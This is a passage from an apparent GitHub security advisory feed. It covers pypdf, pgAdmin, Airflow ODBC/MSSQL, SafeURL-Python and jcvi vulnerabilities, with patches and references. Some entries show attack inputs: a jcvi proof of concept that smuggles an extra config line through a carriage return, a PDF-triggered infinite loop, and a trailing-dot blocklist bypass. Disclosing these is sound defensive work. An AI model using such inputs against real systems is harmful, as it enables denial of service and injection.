<p>The issue was introduced with <a href="https://github.com/py-pdf/pypdf/pull/969">https://github.com/py-pdf/pypdf/pull/969</a></p>
<h3 id="patches">Patches</h3>
<p>The issue was fixed with <a href="https://github.com/py-pdf/pypdf/pull/1828">https://github.com/py-pdf/pypdf/pull/1828</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot update your version of pypdf, you should modify <code>pypdf/generic/_data_structures.py</code>:</p>
<pre><code>OLD: while peek not in (b"\r", b"\n"):
NEW: while peek not in (b"\r", b"\n", b""):
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/py-pdf/pypdf/security/advisories/GHSA-4vvm-4w3v-6mr8">https://github.com/py-pdf/pypdf/security/advisories/GHSA-4vvm-4w3v-6mr8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36464">https://nvd.nist.gov/vuln/detail/CVE-2023-36464</a></li>
<li><a href="https://github.com/py-pdf/pypdf/pull/1828">https://github.com/py-pdf/pypdf/pull/1828</a></li>
<li><a href="https://github.com/py-pdf/pypdf/pull/969">https://github.com/py-pdf/pypdf/pull/969</a></li>
<li><a href="https://github.com/py-pdf/pypdf/commit/b0e5c689df689ab173df84dacd77b6fc3c161932">https://github.com/py-pdf/pypdf/commit/b0e5c689df689ab173df84dacd77b6fc3c161932</a></li>
<li><a href="https://github.com/py-pdf/pypdf/releases/tag/3.9.0">https://github.com/py-pdf/pypdf/releases/tag/3.9.0</a></li>
<li><a href="https://github.com/advisories/GHSA-4vvm-4w3v-6mr8">https://github.com/advisories/GHSA-4vvm-4w3v-6mr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4vvm-4w3v-6mr8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-30T20:33:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pypdf] pypdf and PyPDF2 possible Infinite Loop when a comment isn't followed by a character]]></title>
        <id>https://github.com/advisories/GHSA-4vvm-4w3v-6mr8</id>
        <link href="https://github.com/advisories/GHSA-4vvm-4w3v-6mr8"/>
        <updated>2023-06-30T20:33:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker who uses this vulnerability can craft a PDF which leads to an infinite loop if <code>__parse_content_stream</code> is executed. This infinite loop blocks the current process and can utilize a single core of the CPU by 100%. It does not affect memory usage. That is, for example, the case if the user extracted text from such a PDF.</p>
<p>Example Code and a PDF that causes the issue:</p>
<pre><code class="language-python">from pypdf import PdfReader

# https://objects.githubusercontent.com/github-production-repository-file-5c1aeb/3119517/11367871?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230627%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20230627T201018Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=d71c8fd9181c4875f0c04d563b6d32f1d4da6e7b2e6be2f14479ce4ecdc9c8b2&amp;X-Amz-SignedHeaders=host&amp;actor_id=1658117&amp;key_id=0&amp;repo_id=3119517&amp;response-content-disposition=attachment%3Bfilename%3DMiFO_LFO_FEIS_NOA_Published.3.pdf&amp;response-content-type=application%2Fpdf
reader = PdfReader("MiFO_LFO_FEIS_NOA_Published.3.pdf")
page = reader.pages[0]
page.extract_text()
</code></pre>
<p>The issue was introduced with <a href="https://github.com/py-pdf/pypdf/pull/969">https://github.com/py-pdf/pypdf/pull/969</a></p>
<h3 id="patches">Patches</h3>
<p>The issue was fixed with <a href="https://github.com/py-pdf/pypdf/pull/1828">https://github.com/py-pdf/pypdf/pull/1828</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot update your version of pypdf, you should modify <code>pypdf/generic/_data_structures.py</code>:</p>
<pre><code>OLD: while peek not in (b"\r", b"\n"):
NEW: while peek not in (b"\r", b"\n", b""):
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/py-pdf/pypdf/security/advisories/GHSA-4vvm-4w3v-6mr8">https://github.com/py-pdf/pypdf/security/advisories/GHSA-4vvm-4w3v-6mr8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36464">https://nvd.nist.gov/vuln/detail/CVE-2023-36464</a></li>
<li><a href="https://github.com/py-pdf/pypdf/pull/1828">https://github.com/py-pdf/pypdf/pull/1828</a></li>
<li><a href="https://github.com/py-pdf/pypdf/pull/969">https://github.com/py-pdf/pypdf/pull/969</a></li>
<li><a href="https://github.com/py-pdf/pypdf/commit/b0e5c689df689ab173df84dacd77b6fc3c161932">https://github.com/py-pdf/pypdf/commit/b0e5c689df689ab173df84dacd77b6fc3c161932</a></li>
<li><a href="https://github.com/py-pdf/pypdf/releases/tag/3.9.0">https://github.com/py-pdf/pypdf/releases/tag/3.9.0</a></li>
<li><a href="https://github.com/advisories/GHSA-4vvm-4w3v-6mr8">https://github.com/advisories/GHSA-4vvm-4w3v-6mr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4vvm-4w3v-6mr8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-30T20:33:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pgadmin4] pgAdmin 4 Path Traversal vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-cr8c-972v-rmp3</id>
        <link href="https://github.com/advisories/GHSA-cr8c-972v-rmp3"/>
        <updated>2023-06-30T20:26:43.000Z</updated>
        <content type="html"><![CDATA[<p>When run in server mode, pgAdmin 4 allows users to store files on the server under individual storage directories. Files such as SQL scripts may be uploaded through the user interface. The URI to which upload requests are made fails to validate the upload path to prevent path traversal techniques being used to store files outside of the storage directory. A malicious, but authorised and authenticated user can construct an HTTP request using their existing CSRF token and session cookie to manually upload files to any location that the operating system user account under which pgAdmin is running has permission to write.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-0959">https://nvd.nist.gov/vuln/detail/CVE-2022-0959</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2063759">https://bugzilla.redhat.com/show_bug.cgi?id=2063759</a></li>
<li><a href="https://github.com/pgadmin-org/pgadmin4/commit/dccd4f0bbaafa783d9f0360c7592b128d5cc3928">https://github.com/pgadmin-org/pgadmin4/commit/dccd4f0bbaafa783d9f0360c7592b128d5cc3928</a></li>
<li><a href="https://github.com/advisories/GHSA-cr8c-972v-rmp3">https://github.com/advisories/GHSA-cr8c-972v-rmp3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cr8c-972v-rmp3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-03-17T00:00:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow-providers-microsoft-mssql] Apache Airflow ODBC Provider, Apache Airflow MSSQL Provider Improper Input Validation vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-q57w-826p-46jr</id>
        <link href="https://github.com/advisories/GHSA-q57w-826p-46jr"/>
        <updated>2023-06-30T20:26:35.000Z</updated>
        <content type="html"><![CDATA[<p>Input Validation vulnerability in Apache Software Foundation Apache Airflow ODBC Provider, Apache Software Foundation Apache Airflow MSSQL Provider.This&nbsp;vulnerability is considered low since it requires DAG code to use <code>get_sqlalchemy_connection</code> and someone with access to connection resources specifically&nbsp;updating the connection to exploit it.</p>
<p>This issue affects Apache Airflow ODBC Provider: before 4.0.0; Apache Airflow MSSQL Provider: before 3.4.1.</p>
<p>It is recommended to&nbsp;upgrade to a version that is not affected</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-35798">https://nvd.nist.gov/vuln/detail/CVE-2023-35798</a></li>
<li><a href="https://github.com/apache/airflow/pull/31984">https://github.com/apache/airflow/pull/31984</a></li>
<li><a href="https://lists.apache.org/thread/951rb9m7wwox5p30tdvcfjxq8j1mp4pj">https://lists.apache.org/thread/951rb9m7wwox5p30tdvcfjxq8j1mp4pj</a></li>
<li><a href="https://github.com/apache/airflow/commit/b6836986846058e9e5fa271fb7b22ae721020787">https://github.com/apache/airflow/commit/b6836986846058e9e5fa271fb7b22ae721020787</a></li>
<li><a href="https://github.com/advisories/GHSA-q57w-826p-46jr">https://github.com/advisories/GHSA-q57w-826p-46jr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q57w-826p-46jr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-27T12:30:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow-providers-odbc] Apache Airflow ODBC Provider, Apache Airflow MSSQL Provider Improper Input Validation vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-q57w-826p-46jr</id>
        <link href="https://github.com/advisories/GHSA-q57w-826p-46jr"/>
        <updated>2023-06-30T20:26:35.000Z</updated>
        <content type="html"><![CDATA[<p>Input Validation vulnerability in Apache Software Foundation Apache Airflow ODBC Provider, Apache Software Foundation Apache Airflow MSSQL Provider.This&nbsp;vulnerability is considered low since it requires DAG code to use <code>get_sqlalchemy_connection</code> and someone with access to connection resources specifically&nbsp;updating the connection to exploit it.</p>
<p>This issue affects Apache Airflow ODBC Provider: before 4.0.0; Apache Airflow MSSQL Provider: before 3.4.1.</p>
<p>It is recommended to&nbsp;upgrade to a version that is not affected</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-35798">https://nvd.nist.gov/vuln/detail/CVE-2023-35798</a></li>
<li><a href="https://github.com/apache/airflow/pull/31984">https://github.com/apache/airflow/pull/31984</a></li>
<li><a href="https://lists.apache.org/thread/951rb9m7wwox5p30tdvcfjxq8j1mp4pj">https://lists.apache.org/thread/951rb9m7wwox5p30tdvcfjxq8j1mp4pj</a></li>
<li><a href="https://github.com/apache/airflow/commit/b6836986846058e9e5fa271fb7b22ae721020787">https://github.com/apache/airflow/commit/b6836986846058e9e5fa271fb7b22ae721020787</a></li>
<li><a href="https://github.com/advisories/GHSA-q57w-826p-46jr">https://github.com/advisories/GHSA-q57w-826p-46jr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q57w-826p-46jr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-27T12:30:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow-providers-odbc] Apache Airflow ODBC Provider Argument Injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-9766-v29c-4vm7</id>
        <link href="https://github.com/advisories/GHSA-9766-v29c-4vm7"/>
        <updated>2023-06-30T20:26:05.000Z</updated>
        <content type="html"><![CDATA[<p>Improper Neutralization of Argument Delimiters in a Command ('Argument Injection') vulnerability in Apache Software Foundation Apache Airflow ODBC Provider.
In OdbcHook, A privilege escalation vulnerability exists in a system due to controllable ODBC driver parameters that allow the loading of arbitrary dynamic-link libraries, resulting in command execution.
Starting version 4.0.0 driver can be set only from the hook constructor.
This issue affects Apache Airflow ODBC Provider: before 4.0.0.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-34395">https://nvd.nist.gov/vuln/detail/CVE-2023-34395</a></li>
<li><a href="https://github.com/apache/airflow/pull/31713">https://github.com/apache/airflow/pull/31713</a></li>
<li><a href="https://lists.apache.org/thread/l26yykftzbhc9tgcph8cso88bc2lqwwd">https://lists.apache.org/thread/l26yykftzbhc9tgcph8cso88bc2lqwwd</a></li>
<li><a href="https://github.com/apache/airflow/commit/2844dad1c762f5c7dd1271866d3661bf66657300">https://github.com/apache/airflow/commit/2844dad1c762f5c7dd1271866d3661bf66657300</a></li>
<li><a href="https://github.com/advisories/GHSA-9766-v29c-4vm7">https://github.com/advisories/GHSA-9766-v29c-4vm7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9766-v29c-4vm7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-27T12:30:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[SafeURL-Python] SafeURL-Python's hostname blocklist does not block FQDNs]]></title>
        <id>https://github.com/advisories/GHSA-373w-rj84-pv6x</id>
        <link href="https://github.com/advisories/GHSA-373w-rj84-pv6x"/>
        <updated>2023-06-29T15:02:18.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
<p>If a hostname was blacklisted, it was possible to bypass the blacklist by requesting the FQDN of the host (e.g. adding <code>.</code> to the end).</p>
<h3 id="impact">Impact</h3>
<p>The main purpose of this library is to block requests to internal/private IPs and these cannot be bypassed using this finding. But if a library user had specifically set certain hostnames as blocked, then an attacker would be able to circumvent that block to cause SSRFs to request those hostnames.</p>
<h3 id="patches">Patches</h3>
<p>Fixed by <a href="https://github.com/IncludeSecurity/safeurl-python/pull/6">https://github.com/IncludeSecurity/safeurl-python/pull/6</a></p>
<h3 id="credit">Credit</h3>
<p><a href="https://github.com/Sim4n6">https://github.com/Sim4n6</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/IncludeSecurity/safeurl-python/security/advisories/GHSA-373w-rj84-pv6x">https://github.com/IncludeSecurity/safeurl-python/security/advisories/GHSA-373w-rj84-pv6x</a></li>
<li><a href="https://github.com/IncludeSecurity/safeurl-python/pull/6">https://github.com/IncludeSecurity/safeurl-python/pull/6</a></li>
<li><a href="https://github.com/IncludeSecurity/safeurl-python/commit/c4f9677f8790a58eaa1953bac286cca75a5f580e">https://github.com/IncludeSecurity/safeurl-python/commit/c4f9677f8790a58eaa1953bac286cca75a5f580e</a></li>
<li><a href="https://github.com/advisories/GHSA-373w-rj84-pv6x">https://github.com/advisories/GHSA-373w-rj84-pv6x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-373w-rj84-pv6x</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-06-29T15:02:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jcvi] jcvi vulnerable to Configuration Injection due to unsanitized user input ]]></title>
        <id>https://github.com/advisories/GHSA-x49m-3cw7-gq5q</id>
        <link href="https://github.com/advisories/GHSA-x49m-3cw7-gq5q"/>
        <updated>2023-07-05T17:16:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A configuration injection happens when user input is considered by the application in an unsanitized format and can reach the configuration file. A malicious user may craft a special payload that may lead to a command injection.</p>
<h3 id="poc">PoC</h3>
<p>The vulnerable code snippet is <a href="https://github.com/tanghaibao/jcvi/blob/cede6c65c8e7603cb266bc3395ac8f915ea9eac7/jcvi/apps/base.py#LL2227C1-L2228C41">/jcvi/apps/base.py#LL2227C1-L2228C41</a>. Under some circumstances a user input is retrieved and stored within the <code>fullpath</code> variable which reaches the configuration file <code>~/.jcvirc</code>.</p>
<pre><code class="language-python">        fullpath = input(msg).strip()
        config.set(PATH, name, fullpath)
</code></pre>
<p>I ripped a part of the codebase into a runnable PoC as follows. All the PoC does is call the <code>getpath()</code> function under some circumstances.</p>
<pre><code class="language-python">from configparser import (
    ConfigParser,
    RawConfigParser,
    NoOptionError,
    NoSectionError,
    ParsingError,
)

import errno
import os
import sys
import os.path as op
import shutil
import signal
import sys
import logging


def is_exe(fpath):
    return op.isfile(fpath) and os.access(fpath, os.X_OK)


def which(program):
    """
    Emulates the unix which command.

    &gt;&gt;&gt; which("cat")
    "/bin/cat"
    &gt;&gt;&gt; which("nosuchprogram")
    """
    fpath, fname = op.split(program)
    if fpath:
        if is_exe(program):
            return program
    else:
        for path in os.environ["PATH"].split(os.pathsep):
            exe_file = op.join(path, program)
            if is_exe(exe_file):
                return exe_file

    return None


def getpath(cmd, name=None, url=None, cfg="~/.jcvirc", warn="exit"):
    """
    Get install locations of common binaries
    First, check ~/.jcvirc file to get the full path
    If not present, ask on the console and store
    """
    p = which(cmd)  # if in PATH, just returns it
    if p:
        return p

    PATH = "Path"
    config = RawConfigParser()
    cfg = op.expanduser(cfg)
    changed = False
    if op.exists(cfg):
        config.read(cfg)

    assert name is not None, "Need a program name"

    try:
        fullpath = config.get(PATH, name)
    except NoSectionError:
        config.add_section(PATH)
        changed = True

    try:
        fullpath = config.get(PATH, name)
    except NoOptionError:
        msg = "=== Configure path for {0} ===\n".format(name, cfg)
        if url:
            msg += "URL: {0}\n".format(url)
        msg += "[Directory that contains `{0}`]: ".format(cmd)
        fullpath = input(msg).strip()
        config.set(PATH, name, fullpath)
        changed = True

    path = op.join(op.expanduser(fullpath), cmd)
    if warn == "exit":
        try:
            assert is_exe(path), "***ERROR: Cannot execute binary `{0}`. ".format(path)
        except AssertionError as e:
            sys.exit("{0!s}Please verify and rerun.".format(e))

    if changed:
        configfile = open(cfg, "w")
        config.write(configfile)
        logging.debug("Configuration written to `{0}`.".format(cfg))

    return path


# Call to getpath
path = getpath("not-part-of-path", name="CLUSTALW2", warn="warn")
print(path)
</code></pre>
<p>To run the PoC, you need to remove the config file <code>~/.jcvirc</code> to emulate the first run, </p>
<pre><code class="language-bash"># Run the PoC with the payload
echo -e "e\rvvvvvvvv = zzzzzzzz\n" | python3 poc.py
</code></pre>
<p><img alt="image" src="https://user-images.githubusercontent.com/13036531/247852364-f8a384a3-fc62-41ca-b467-877d197ac6ff.png"></p>
<p>You can notice the random key/value characters <code>vvvvvvvv = zzzzzzzz</code> were successfully injected.</p>
<h3 id="impact">Impact</h3>
<p>The impact of a configuration injection may vary. Under some conditions, it may lead to command injection if there is for instance shell code execution from the configuration file values.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tanghaibao/jcvi/security/advisories/GHSA-x49m-3cw7-gq5q">https://github.com/tanghaibao/jcvi/security/advisories/GHSA-x49m-3cw7-gq5q</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-35932">https://nvd.nist.gov/vuln/detail/CVE-2023-35932</a></li>
<li><a href="https://github.com/tanghaibao/jcvi/blob/cede6c65c8e7603cb266bc3395ac8f915ea9eac7/jcvi/apps/base.py#LL2227C1-L2228C41">https://github.com/tanghaibao/jcvi/blob/cede6c65c8e7603cb266bc3395ac8f915ea9eac7/jcvi/apps/base.py#LL2227C1-L2228C41</a></li>
<li><a href="https://github.com/advisories/GHSA-x49m-3cw7-gq5q">https://github.com/advisories/GHSA-x49m-3cw7-gq5q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x49m-3cw7-gq5q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-06-23T21:44:35.000Z</published>
    </entry>
</feed>